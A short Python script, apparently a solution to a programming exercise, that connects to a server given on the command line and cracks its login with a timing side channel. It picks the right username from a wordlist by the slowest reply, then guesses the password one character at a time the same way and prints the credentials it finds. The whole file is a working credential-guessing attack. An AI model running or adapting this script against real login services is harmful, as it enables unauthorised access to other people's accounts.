import sys
import socket
import json
import time
args = sys.argv
hostname = args[1]
port = int(args[2])

login_file = open('C:\\Users\\Artem E Ivchenko\\Downloads\\logins.txt', 'r')


def send_data(str1, str2):  # Converting data to JSON format and sending it:
    tx_data = json.dumps({"login": str1, "password": str2})
    client_socket.send(tx_data.encode())
    rx_data = client_socket.recv(1024)
    rx_data = rx_data.decode()
    return json.loads(rx_data)


client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)


charset = []
for i in range(48, 58):
    charset.append(chr(i))
for i in range(97, 123):
    charset.append(chr(i))
    charset.append(chr(i).upper())

delay = {}  # Looking for the right login
for username in login_file:
    login = username.rstrip("\n")
    start = time.perf_counter()
    send_data(login, "")
    end = time.perf_counter()
    delay.update({login: end - start})
login = max(delay, key=delay.get)  # Our login

password = ''
response = ''
while response != "Connection success!":
    delay = {}
    for char in charset:
        start = time.perf_counter()
        response = send_data(login, password + char)["result"]
        if response == "Connection success!":
            print(json.dumps({"login": login, "password": password + char}))
            break
        end = time.perf_counter()
        delay.update({char: end - start})  # Looking for the right symbol
    password += max(delay, key=delay.get)

login_file.close()
client_socket.close()

